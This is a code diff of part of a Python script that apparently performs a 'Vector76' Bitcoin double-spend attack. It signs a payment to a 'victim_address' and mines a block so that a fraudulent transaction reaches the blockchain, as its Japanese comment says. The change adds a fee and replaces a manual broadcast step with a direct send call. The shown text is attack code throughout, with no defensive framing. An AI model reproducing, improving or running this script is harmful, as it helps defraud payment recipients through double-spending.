@@ -85,18 +85,12 @@ if balance < send_amount:
     print(f"[!] insufficient funds. ")
     exit()
 
-
-change_btc_amt = (balance - send_amount) #おつり
-if testnet:
-    tx_victim = [{"address": victim_address, "value": send_amount}, {"address": transaction_util.wiftoaddr(fake_send_from), "value": change_btc_amt}]
-else:
-    tx_victim = [{"address": victim_address, "value": send_amount}, {"address": transaction_util.wiftoaddr(fake_send_from), "value": change_btc_amt}]
+fee = 10
+change_btc_amt = (balance - send_amount) - fee#おつり
+tx_victim = [{"address": victim_address, "value": send_amount}, {"address": transaction_util.wiftoaddr(fake_send_from), "value": change_btc_amt}]
 
 tx_victim = transaction_util.mktx(inputs, tx_victim)
-if testnet:
-    tx_victim = cryptos.serialize(transaction_util.sign(tx_victim, 0, fake_send_from))
-else:
-    tx_victim = cryptos.serialize(transaction_util.sign(tx_victim, 0, fake_send_from))
+tx_victim = cryptos.serialize(transaction_util.sign(tx_victim, 0, fake_send_from))
 
 print(inputs)
 print()
@@ -110,7 +104,10 @@ print("--------------------")
 print()
 print()
 print()
-input(f" --- Press enter after broadcasting to something like https://live.blockcypher.com/btc/pushtx/?t={tx_victim} --- ")
+txid = transaction_util.send(fake_send_from, transaction_util.wiftoaddr(fake_send_from), victim_address, send_amount)
+print(txid)
+#transaction_util.pushtx(tx_victim)
+#input(f" --- Press enter after broadcasting to something like https://live.blockcypher.com/btc/pushtx/?t={tx_victim} --- ")
 print()
 print()
 print()
@@ -121,14 +118,12 @@ time.sleep(4) # 詠唱中...  -u-
 print("MNG IBLK SND TMP ITX TOBC  (ブロックをマイニング、ブロックチェーンに不正なトランザクションを送信!)")
 time.sleep(2)
 print(f"Generating Vector76 Block")
-for i in range(4):
-    print(f" {i + 1} / 4   ...")
-    print(generate_block(victim_address, tx_victim, True))
+print(generate_block(victim_address, txid, True))
 
-try:
-    transaction_util.pushtx(tx_victim)
-except:
-    pass
+#try:
+#    transaction_util.pushtx(tx_victim)
+#except:
+#    pass
 
 
 #broadcast_transaction(tx_victim, testnet)
